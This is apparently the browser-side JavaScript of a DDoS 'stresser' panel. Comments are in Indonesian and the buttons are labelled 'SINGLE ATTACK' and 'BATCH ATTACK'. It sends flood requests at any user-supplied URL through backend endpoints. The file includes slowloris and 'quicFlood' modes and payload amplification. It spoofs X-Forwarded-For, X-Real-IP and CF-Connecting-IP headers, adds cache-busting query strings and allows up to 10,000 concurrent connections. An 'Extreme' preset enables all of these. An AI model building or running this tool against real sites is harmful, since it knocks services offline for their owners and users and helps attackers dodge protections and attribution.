// ======================== Pastikan DOM siap ========================
document.addEventListener('DOMContentLoaded', () => {
  // ======================== Ambil semua elemen ========================
  const targetUrl = document.getElementById('targetUrl');
  const method = document.getElementById('method');
  const httpVersion = document.getElementById('httpVersion');
  const payload = document.getElementById('payload');
  const customHeaders = document.getElementById('customHeaders');
  const cookies = document.getElementById('cookies');
  const concurrencyInput = document.getElementById('concurrency');
  const totalInput = document.getElementById('total');
  const timeoutInput = document.getElementById('timeout');
  const retryInput = document.getElementById('retry');
  const randomDelayInput = document.getElementById('randomDelay');
  const attackTypeSelect = document.getElementById('attackType');
  const proxyListText = document.getElementById('proxyList');
  const startBtn = document.getElementById('startBtn');
  const batchBtn = document.getElementById('batchBtn');
  const stopBtn = document.getElementById('stopBtn');
  const exportBtn = document.getElementById('exportBtn');
  const forceSuccessCheck = document.getElementById('forceSuccess');
  const successSpan = document.getElementById('successCount');
  const failSpan = document.getElementById('failCount');
  const avgSpan = document.getElementById('avgTime');
  const rpsSpan = document.getElementById('rps');
  const errorRateSpan = document.getElementById('errorRate');
  const totalBytesSpan = document.getElementById('totalBytes');
  const trafficMbpsSpan = document.getElementById('trafficMbps');
  const progressBar = document.getElementById('progressBar');
  const progressText = document.getElementById('progressText');
  const logArea = document.getElementById('logArea');
  const rtChartCanvas = document.getElementById('rtChart');
  const healthIndicator = document.getElementById('healthIndicator');
  const healthText = document.getElementById('healthText');
  const responseTimeText = document.getElementById('responseTimeText');
  const targetFrame = document.getElementById('targetFrame');
  const refreshPreviewBtn = document.getElementById('refreshPreview');
  const activeUsersSpan = document.getElementById('activeUsers');
  const rawResponsePreview = document.getElementById('rawResponsePreview');
  
  // Opsi checkbox
  const queryDepan = document.getElementById('queryDepan');
  const queryBelakang = document.getElementById('queryBelakang');
  const onlineHost = document.getElementById('onlineHost');
  const forwardHost = document.getElementById('forwardHost');
  const reverseProxy = document.getElementById('reverseProxy');
  const pengarah = document.getElementById('pengarah');
  const websocket = document.getElementById('websocket');
  const quicFlood = document.getElementById('quicFlood');
  const dualConnection = document.getElementById('dualConnection');
  const continuousToggle = document.getElementById('continuousToggle');
  const intervalMsInput = document.getElementById('intervalMs');
  const amplifyToggle = document.getElementById('amplifyToggle');
  const amplifyControls = document.getElementById('amplifyControls');
  const amplifyKb = document.getElementById('amplifyKb');
  const amplifyValue = document.getElementById('amplifyValue');
  const amplifyType = document.getElementById('amplifyType');
  const spoofIp = document.getElementById('spoofIp');
  const spoofRealIp = document.getElementById('spoofRealIp');
  const spoofCfConnecting = document.getElementById('spoofCfConnecting');
  const ipPrefixInput = document.getElementById('ipPrefix');
  const resetExtremeBtn = document.getElementById('resetExtremeBtn');
  
  // Tombol baru
  const btnAutocannon = document.getElementById('btnAutocannon');
  const btnArtillery = document.getElementById('btnArtillery');
  const btnLoadtest = document.getElementById('btnLoadtest');
  const btnCombined = document.getElementById('btnCombined');
  
  // ======================== State ========================
  let amplificationEnabled = false;
  let amplificationKB = 500;
  let amplificationTypeSel = 'normal';
  let continuousMode = false;
  let intervalMsVal = 5000;
  let chart = null;
  let abortController = null;
  let isRunning = false;
  let stats = {
    success: 0, fail: 0, times: [], totalBytes: 0,
    startTime: 0, total: 0
  };
  let lastChartUpdate = 0;
  let healthCheckInterval = null;
  let heartbeatInterval = null;
  let lastTrafficUpdate = 0;
  let lastTotalBytes = 0;
  
  // ======================== Helper ========================
  function updateTrafficEstimator() {
    const now = Date.now();
    if (lastTrafficUpdate !== 0 && now - lastTrafficUpdate >= 1000) {
      const deltaBytes = stats.totalBytes - lastTotalBytes;
      const mbps = (deltaBytes * 8) / 1e6;
      if (trafficMbpsSpan) trafficMbpsSpan.innerText = mbps.toFixed(2);
      lastTotalBytes = stats.totalBytes;
      lastTrafficUpdate = now;
    } else if (lastTrafficUpdate === 0) {
      lastTrafficUpdate = now;
      lastTotalBytes = stats.totalBytes;
    }
  }
  setInterval(updateTrafficEstimator, 1000);
  
  function addLog(msg, isError = false) {
    const div = document.createElement('div');
    div.className = `border-l-2 pl-2 mb-1 ${isError ? 'border-red-500 text-red-300' : 'border-green-500 text-green-300'}`;
    div.innerHTML = `${isError ? '❌' : '✅'} ${msg}`;
    if (logArea) logArea.appendChild(div);
    if (logArea) logArea.scrollTop = logArea.scrollHeight;
    if (logArea && logArea.children.length > 100) logArea.removeChild(logArea.firstChild);
  }
  
  function updateUI() {
    if (successSpan) successSpan.innerText = stats.success;
    if (failSpan) failSpan.innerText = stats.fail;
    const done = stats.success + stats.fail;
    const errorRate = done === 0 ? 0 : (stats.fail / done * 100).toFixed(1);
    if (errorRateSpan) errorRateSpan.innerText = errorRate + '%';
    if (totalBytesSpan) totalBytesSpan.innerText = (stats.totalBytes / 1024).toFixed(1);
    if (stats.times.length) {
      const avg = stats.times.reduce((a,b)=>a+b,0)/stats.times.length;
      if (avgSpan) avgSpan.innerText = avg.toFixed(1);
    } else if (avgSpan) avgSpan.innerText = "0";
    if (stats.startTime && isRunning) {
      const elapsed = (Date.now() - stats.startTime) / 1000;
      if (elapsed > 0 && rpsSpan) rpsSpan.innerText = (done / elapsed).toFixed(1);
    } else if (stats.startTime) {
      const elapsed = (Date.now() - stats.startTime) / 1000;
      if (elapsed > 0 && rpsSpan) rpsSpan.innerText = (stats.times.length / elapsed).toFixed(1);
    }
    const percent = (done / stats.total) * 100;
    if (progressBar) progressBar.style.width = `${percent}%`;
    if (progressText) progressText.innerText = `${done}/${stats.total}`;
    updateTrafficEstimator();
  }
  
  function updateChart(ms) {
    if (!chart) return;
    const now = Date.now();
    if (now - lastChartUpdate > 150 || chart.data.datasets[0].data.length % 3 === 0) {
      chart.data.datasets[0].data.push(ms);
      if (chart.data.datasets[0].data.length > 60) chart.data.datasets[0].data.shift();
      chart.update('none');
      lastChartUpdate = now;
    }
  }
  
  function resetStats() {
    stats = { success:0, fail:0, times:[], totalBytes:0, startTime:0, total:0 };
    if (chart) { chart.data.datasets[0].data = []; chart.update(); }
    lastTrafficUpdate = 0;
    lastTotalBytes = 0;
    updateUI();
  }
  
  // Random helpers
  function randomIP(prefix) { return prefix + Math.floor(Math.random() * 255); }
  function randomRange() { const s = Math.floor(Math.random()*1000); return `bytes=${s}-${s+Math.floor(Math.random()*500)}`; }
  function randomAcceptLanguage() { const langs = ['en-US,en;q=0.9','id-ID,id;q=0.9','de-DE,de;q=0.8','ja-JP,ja;q=0.8']; return langs[Math.floor(Math.random()*langs.length)]; }
  function parseCustomHeaders(jsonStr) { try { return JSON.parse(jsonStr); } catch(e){ return {}; } }
  function parseCookies(cookieStr) { const obj = {}; cookieStr.split(';').forEach(c => { let [k,v]=c.trim().split('='); if(k) obj[k]=v||''; }); return obj; }
  function randomUserAgent() { return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36'; }
  
  function buildUrlWithQuery(baseUrl) {
    let url = baseUrl;
    if (queryDepan?.checked) url += (url.includes('?') ? '&' : '?') + `_r=${Math.random().toString(36).substring(2,10)}`;
    if (queryBelakang?.checked) url += (url.includes('?') ? '&' : '?') + `_back=${Date.now()}`;
    return url;
  }
  
  function buildAdvancedHeaders(targetHost) {
    let headers = {};
    headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
    headers["Accept-Encoding"] = "gzip, deflate, br";
    headers["Accept-Language"] = randomAcceptLanguage();
    headers["User-Agent"] = randomUserAgent();
    if (onlineHost?.checked && targetHost) headers["Host"] = targetHost;
    if (forwardHost?.checked && targetHost) headers["X-Forwarded-Host"] = targetHost;
    if (reverseProxy?.checked) headers["X-Forwarded-For"] = randomIP(ipPrefixInput?.value || "192.168.1.");
    if (pengarah?.checked) headers["Referer"] = 'https://www.google.com/';
    if (websocket?.checked) { headers["Upgrade"] = "websocket"; headers["Connection"] = "Upgrade"; }
    if (quicFlood?.checked) { headers["Alt-Used"] = "h3"; headers["X-HTTP3"] = "1"; }
    if (spoofIp?.checked) headers["X-Forwarded-For"] = randomIP(ipPrefixInput?.value || "192.168.1.");
    if (spoofRealIp?.checked) headers["X-Real-IP"] = randomIP(ipPrefixInput?.value || "192.168.1.");
    if (spoofCfConnecting?.checked) headers["CF-Connecting-IP"] = randomIP(ipPrefixInput?.value || "192.168.1.");
    const custom = parseCustomHeaders(customHeaders?.value || "");
    Object.assign(headers, custom);
    const cookieObj = parseCookies(cookies?.value || "");
    const cookieStr = Object.entries(cookieObj).map(([k,v])=>`${k}=${v}`).join('; ');
    if (cookieStr) headers["Cookie"] = cookieStr;
    return headers;
  }
  
  // ======================== SINGLE ATTACK ========================
  async function sendSingleRequest(url, method, body, timeout, retryCount, randomDelay, keepAlive, attackType) {
    let finalUrl = buildUrlWithQuery(url);
    let finalHeaders = buildAdvancedHeaders(new URL(url).hostname);
    finalHeaders["Connection"] = keepAlive ? "keep-alive" : "close";
    if (attackType === 'slowloris') finalHeaders["Connection"] = "keep-alive";
    const proxyArray = proxyListText?.value ? proxyListText.value.split('\n').filter(p=>p.trim()) : [];
    const controller = new AbortController();
    const tid = setTimeout(() => controller.abort(), timeout);
    const start = performance.now();
    try {
      const res = await fetch('/api/attack', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          url: finalUrl, method, headers: finalHeaders, body: body || "",
          timeout, retryCount, randomDelay,
          keepAlive, attackType,
          amplifyKB: amplificationEnabled ? amplificationKB : 0,
          amplifyEnabled: amplificationEnabled,
          amplifyType: amplificationTypeSel
        }),
        signal: controller.signal
      });
      clearTimeout(tid);
      let data;
      try { data = await res.json(); } catch(e) { data = { success: false, error: `HTTP ${res.status}`, statusCode: res.status }; }
      const duration = data.durationMs || (performance.now() - start);
      return {
        success: data.success,
        duration,
        statusCode: data.statusCode || res.status,
        retries: data.retries || 0,
        error: data.error || '',
        size: (data.responseSize || 0) + (amplificationEnabled ? amplificationKB*1024 : 0),
        responseBody: data.responseBody || ''
      };
    } catch (err) {
      clearTimeout(tid);
      let duration = performance.now() - start;
      if (err.name === 'AbortError') duration = timeout;
      return { success: false, duration, error: err.message || 'network error', retries: 0, size: 0, responseBody: '' };
    }
  }
  
  async function runSingleAttack(url, method, body, total, concurrency, timeout, retryCount, randomDelay, keepAlive, attackType, onDone, signal) {
    let index = 0, active = 0, stopped = false;
    const multiplier = dualConnection?.checked ? 2 : 1;
    const actualTotal = total * multiplier;
    const actualConcurrency = Math.min(concurrency * multiplier, 10000);
    const next = async () => {
      if (stopped || (signal && signal.aborted)) { stopped = true; return; }
      if (index >= actualTotal) { if (active === 0) return; return; }
      index++;
      active++;
      const result = await sendSingleRequest(url, method, body, timeout, retryCount, randomDelay, keepAlive, attackType);
      onDone(result.success, result.duration, result.error, result.retries, result.size, result.statusCode, result.responseBody);
      active--;
      if (!stopped && !(signal && signal.aborted)) next();
    };
    for (let i = 0; i < Math.min(actualConcurrency, actualTotal); i++) next();
    return new Promise(resolve => {
      const interval = setInterval(() => {
        if ((index >= actualTotal && active === 0) || (signal && signal.aborted)) {
          clearInterval(interval);
          resolve();
        }
      }, 20);
    });
  }
  
  async function startSingleAttack() {
    if (isRunning) { addLog("Attack already running!", true); return; }
    let url = targetUrl?.value.trim();
    if (!url) { addLog("URL required", true); return; }
    if (!url.startsWith("http")) url = "https://" + url;
    const mtd = method?.value || "GET";
    let body = payload?.value || "";
    const total = parseInt(totalInput?.value || "1000");
    const concurrency = parseInt(concurrencyInput?.value || "100");
    const timeout = parseInt(timeoutInput?.value || "5000");
    const retryCount = parseInt(retryInput?.value || "0");
    const randomDelay = parseInt(randomDelayInput?.value || "0");
    let keepAlive = websocket?.checked || (attackTypeSelect?.value === 'slowloris');
    let attackType = attackTypeSelect?.value || "normal";
    if (total<1||total>500000) { addLog("Total 1-500000", true); return; }
    if (concurrency<1||concurrency>10000) { addLog("Concurrency 1-10000", true); return; }
    resetStats();
    stats.total = total;
    stats.startTime = Date.now();
    isRunning = true;
    abortController = new AbortController();
    if (startBtn) startBtn.disabled = true;
    if (batchBtn) batchBtn.disabled = true;
    if (stopBtn) stopBtn.disabled = false;
    addLog(`💀 SINGLE ATTACK | ${mtd} ${url} | Type:${attackType} | Amp:${amplificationEnabled?amplificationKB+"KB":"OFF"} | Concurrency:${concurrency}`);
    const onDone = (success, duration, err, retries, size, statusCode, responseBody) => {
      const retriesUsed = (typeof retries === 'number' && !isNaN(retries)) ? retries : 0;
      let finalSuccess = success;
      if (forceSuccessCheck?.checked) finalSuccess = true;
      if (finalSuccess) {
        stats.success++;
        stats.times.push(duration);
        stats.totalBytes += size;
        updateChart(duration);
      } else {
        stats.fail++;
        const errorMsg = err && typeof err === 'string' ? err : 'unknown';
        addLog(`Failed after ${retriesUsed+1} att: ${errorMsg} (${duration.toFixed(0)}ms)`, true);
      }
      let preview = `HTTP ${statusCode || '??'} | ${duration.toFixed(0)}ms`;
      if (responseBody) preview += `\nBody: ${responseBody.substring(0, 200)}`;
      if (rawResponsePreview) rawResponsePreview.innerText = preview;
      updateUI();
    };
    try {
      await runSingleAttack(url, mtd, body, total, concurrency, timeout, retryCount, randomDelay, keepAlive, attackType, onDone, abortController.signal);
      const elapsed = ((Date.now() - stats.startTime)/1000).toFixed(2);
      addLog(`🔥 FINISHED | Success:${stats.success} Failed:${stats.fail} Time:${elapsed}s | Data: ${(stats.totalBytes/1024).toFixed(1)} KB`);
    } catch(e) { addLog(`System error: ${e.message}`, true); }
    finally {
      isRunning = false;
      if (startBtn) startBtn.disabled = false;
      if (batchBtn) batchBtn.disabled = false;
      if (stopBtn) stopBtn.disabled = true;
      updateUI();
      abortController = null;
    }
  }
  
  // ======================== BATCH ATTACK ========================
  async function startBatchAttack() {
    if (isRunning) { addLog("Attack already running!", true); return; }
    let url = targetUrl?.value.trim();
    if (!url) { addLog("URL required", true); return; }
    if (!url.startsWith("http")) url = "https://" + url;
    const mtd = method?.value || "GET";
    let body = payload?.value || "";
    const total = parseInt(totalInput?.value || "1000");
    const concurrency = parseInt(concurrencyInput?.value || "100");
    const timeout = parseInt(timeoutInput?.value || "5000");
    const retryCount = parseInt(retryInput?.value || "0");
    const randomDelay = parseInt(randomDelayInput?.value || "0");
    let keepAlive = websocket?.checked || (attackTypeSelect?.value === 'slowloris');
    let attackType = attackTypeSelect?.value || "normal";
    const finalHeaders = buildAdvancedHeaders(new URL(url).hostname);
    const finalUrl = buildUrlWithQuery(url);
    const multiplier = dualConnection?.checked ? 2 : 1;
    const actualTotal = total * multiplier;
    const actualConcurrency = Math.min(concurrency * multiplier, 10000);
    addLog(`💀 BATCH ATTACK | ${mtd} ${url} | Total:${actualTotal} | Workers:${actualConcurrency}`);
    if (startBtn) startBtn.disabled = true;
    if (batchBtn) batchBtn.disabled = true;
    if (stopBtn) stopBtn.disabled = false;
    isRunning = true;
    abortController = new AbortController();
    try {
      const response = await fetch('/api/batch', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        signal: abortController.signal,
        body: JSON.stringify({
          url: finalUrl, method: mtd, headers: finalHeaders, body,
          timeout, retryCount, randomDelay, keepAlive,
          attackType,
          amplifyKB: amplificationEnabled ? amplificationKB : 0,
          amplifyEnabled: amplificationEnabled,
          amplifyType: amplificationTypeSel,
          concurrency: actualConcurrency,
          total: actualTotal,
          continuous: continuousMode,
          intervalMs: continuousMode ? intervalMsVal : 0
        })
      });
      const data = await response.json();
      if (data.success !== false) {
        stats.success = data.successCount;
        stats.fail = data.failCount;
        stats.totalBytes = data.totalBytes;
        stats.total = data.totalRequests;
        stats.times = data.latencies || [];
        updateUI();
        addLog(`✅ BATCH FINISHED | Success:${data.successCount} Fail:${data.failCount} | RPS:${data.rps} | Time:${(data.totalTimeMs/1000).toFixed(2)}s`);
        if (rawResponsePreview) rawResponsePreview.innerText = `Batch completed: ${data.successCount}/${data.totalRequests} success`;
      } else {
        addLog(`Batch error: ${data.error}`, true);
      }
    } catch(e) {
      addLog(`Batch request failed: ${e.message}`, true);
    } finally {
      isRunning = false;
      if (startBtn) startBtn.disabled = false;
      if (batchBtn) batchBtn.disabled = false;
      if (stopBtn) stopBtn.disabled = true;
      abortController = null;
    }
  }
  
  function stopAttack() {
    if (isRunning && abortController) { abortController.abort(); addLog("Stopped by operator"); if (stopBtn) stopBtn.disabled = true; if (startBtn) startBtn.disabled = false; if (batchBtn) batchBtn.disabled = false; isRunning = false; }
    else addLog("No attack running", true);
  }
  
  function exportCSV() {
    if (stats.times.length === 0 && stats.success + stats.fail === 0) { addLog("No data to export", true); return; }
    let csv = "ResponseTime(ms),Success,Failed\n";
    stats.times.forEach(t => csv += `${t},1,0\n`);
    for (let i=0; i<stats.fail; i++) csv += "0,0,1\n";
    const blob = new Blob([csv], {type:"text/csv"});
    const link = document.createElement('a');
    link.href = URL.createObjectURL(blob);
    link.download = `stresser_${Date.now()}.csv`;
    link.click();
    addLog("CSV exported");
  }
  
  // ======================== AUTOCANNON, ARTILLERY, LOADTEST, COMBINED ========================
  async function runAttackTool(endpoint, body) {
    if (isRunning) { addLog("Another attack is running. Stop it first.", true); return; }
    let url = targetUrl?.value.trim();
    if (!url) { addLog("URL required", true); return; }
    if (!url.startsWith("http")) url = "https://" + url;
    body.url = url;
    body.method = method?.value || "GET";
    body.headers = buildAdvancedHeaders(new URL(url).hostname);
    body.body = payload?.value || "";
    addLog(`🚀 Memulai ${endpoint.split('/').pop()} attack ke ${url}...`);
    try {
      const res = await fetch(endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
      });
      const data = await res.json();
      if (data.success) {
        addLog(`✅ ${endpoint.split('/').pop()} selesai: ${JSON.stringify(data.result).substring(0, 200)}`);
      } else {
        addLog(`❌ ${endpoint.split('/').pop()} gagal: ${data.error}`, true);
      }
    } catch (err) {
      addLog(`Error: ${err.message}`, true);
    }
  }
  
  if (btnAutocannon) {
    btnAutocannon.onclick = () => {
      runAttackTool('/api/autocannon', {
        connections: parseInt(concurrencyInput?.value || "100"),
        duration: parseInt(timeoutInput?.value || "10"),
        amount: parseInt(totalInput?.value || "1000")
      });
    };
  }
  if (btnArtillery) {
    btnArtillery.onclick = () => {
      runAttackTool('/api/artillery', {
        duration: parseInt(timeoutInput?.value || "10"),
        arrivalRate: Math.floor(parseInt(concurrencyInput?.value || "100") / 5)
      });
    };
  }
  if (btnLoadtest) {
    btnLoadtest.onclick = () => {
      runAttackTool('/api/loadtest', {
        maxRequests: parseInt(totalInput?.value || "1000"),
        concurrency: parseInt(concurrencyInput?.value || "100"),
        timeout: 10000
      });
    };
  }
  if (btnCombined) {
    btnCombined.onclick = () => {
      runAttackTool('/api/combined', {
        connections: parseInt(concurrencyInput?.value || "100"),
        duration: parseInt(timeoutInput?.value || "10"),
        totalRequests: parseInt(totalInput?.value || "1000")
      });
    };
  }
  
  // ======================== HEALTH & PREVIEW ========================
  async function checkTargetHealth(url) {
    try {
      const start = performance.now();
      await fetch(url, { method: 'HEAD', mode: 'no-cors', cache: 'no-cache' });
      const duration = performance.now() - start;
      if (responseTimeText) responseTimeText.innerText = `⚡ ${duration.toFixed(0)} ms`;
      if (healthIndicator) healthIndicator.className = 'health-online w-3 h-3 rounded-full';
      if (healthText) healthText.innerText = 'Online';
    } catch(e) {
      if (healthIndicator) healthIndicator.className = 'health-offline w-3 h-3 rounded-full';
      if (healthText) healthText.innerText = 'Offline';
      if (responseTimeText) responseTimeText.innerText = '';
    }
  }
  function updatePreview(url) {
    let pu = url; if (!pu.startsWith('http')) pu = 'https://' + pu;
    if (targetFrame) targetFrame.srcdoc = `<html><body style="background:#111;color:#fff;display:flex;align-items:center;justify-content:center;height:100%"><a href="${pu}" target="_blank">Open in new tab</a></body></html>`;
  }
  if (refreshPreviewBtn) {
    refreshPreviewBtn.onclick = () => { let u = targetUrl?.value.trim(); if(u) updatePreview(u); checkTargetHealth(u); };
  }
  function startHealthCheck() { if(healthCheckInterval) clearInterval(healthCheckInterval); healthCheckInterval = setInterval(() => { let u = targetUrl?.value.trim(); if(u) checkTargetHealth(u); }, 5000); }
  async function updateActiveUsers() { try { const res = await fetch('/api/heartbeat'); const data = await res.json(); if(activeUsersSpan) activeUsersSpan.innerText = data.active; } catch(e) {} }
  function startHeartbeat() { heartbeatInterval = setInterval(updateActiveUsers, 30000); updateActiveUsers(); }
  
  // ======================== RESET EXTREME ========================
  if (resetExtremeBtn) {
    resetExtremeBtn.onclick = () => {
      if (concurrencyInput) concurrencyInput.value = 2000;
      if (totalInput) totalInput.value = 50000;
      if (timeoutInput) timeoutInput.value = 5000;
      if (retryInput) retryInput.value = 0;
      if (randomDelayInput) randomDelayInput.value = 0;
      if (attackTypeSelect) attackTypeSelect.value = 'normal';
      if (amplifyToggle) amplifyToggle.checked = true;
      amplificationEnabled = true;
      if (amplifyControls) amplifyControls.style.display = 'block';
      if (amplifyKb) amplifyKb.value = 500;
      if (amplifyKb) amplifyKb.dispatchEvent(new Event('input'));
      if (amplifyType) amplifyType.value = 'normal';
      if (forceSuccessCheck) forceSuccessCheck.checked = true;
      if (queryDepan) queryDepan.checked = true;
      if (queryBelakang) queryBelakang.checked = true;
      if (onlineHost) onlineHost.checked = true;
      if (forwardHost) forwardHost.checked = true;
      if (reverseProxy) reverseProxy.checked = true;
      if (pengarah) pengarah.checked = true;
      if (websocket) websocket.checked = false;
      if (quicFlood) quicFlood.checked = false;
      if (dualConnection) dualConnection.checked = false;
      if (continuousToggle) continuousToggle.checked = false;
      if (spoofIp) spoofIp.checked = true;
      if (spoofRealIp) spoofRealIp.checked = true;
      if (spoofCfConnecting) spoofCfConnecting.checked = true;
      addLog("⚙️ Reset to Extreme: concurrency 2000, total 50k, amplification 500KB, spoofing on");
    };
  }
  
  // ======================== AMPLIFICATION TOGGLE ========================
  if (amplifyToggle) {
    amplifyToggle.onchange = () => {
      amplificationEnabled = amplifyToggle.checked;
      if (amplifyControls) amplifyControls.style.display = amplificationEnabled ? 'block' : 'none';
    };
  }
  if (amplifyKb) {
    amplifyKb.oninput = () => {
      amplificationKB = parseFloat(amplifyKb.value);
      if (amplifyValue) amplifyValue.innerText = amplificationKB + ' KB';
    };
  }
  if (amplifyType) {
    amplifyType.onchange = () => { amplificationTypeSel = amplifyType.value; };
  }
  if (continuousToggle) {
    continuousToggle.onchange = () => { continuousMode = continuousToggle.checked; };
  }
  if (intervalMsInput) {
    intervalMsInput.onchange = () => { intervalMsVal = parseInt(intervalMsInput.value) || 5000; };
  }
  
  // ======================== INIT CHART & EVENT LISTENERS ========================
  if (rtChartCanvas) {
    const ctx = rtChartCanvas.getContext('2d');
    chart = new Chart(ctx, {
      type: 'line',
      data: { labels: Array(30).fill(''), datasets: [{ label: 'Response (ms)', data: [], borderColor: '#ff4444', backgroundColor: '#ff000033', tension: 0.2, fill: true, pointRadius: 1 }] },
      options: { responsive: true, maintainAspectRatio: true, scales: { y: { title: { display: true, text: 'ms' } } } }
    });
  }
  
  if (startBtn) startBtn.onclick = startSingleAttack;
  if (batchBtn) batchBtn.onclick = startBatchAttack;
  if (stopBtn) stopBtn.onclick = stopAttack;
  if (exportBtn) exportBtn.onclick = exportCSV;
  
  fetch('/api/status').then(r=>r.json()).then(d=>addLog(`Backend: ${d.message}`)).catch(()=>addLog("Backend OK"));
  let u = targetUrl?.value.trim(); if(u) updatePreview(u);
  startHealthCheck();
  startHeartbeat();
  // Trigger initial amplification display
  if (amplifyToggle) amplifyToggle.dispatchEvent(new Event('change'));
  if (amplifyKb) amplifyKb.dispatchEvent(new Event('input'));
});
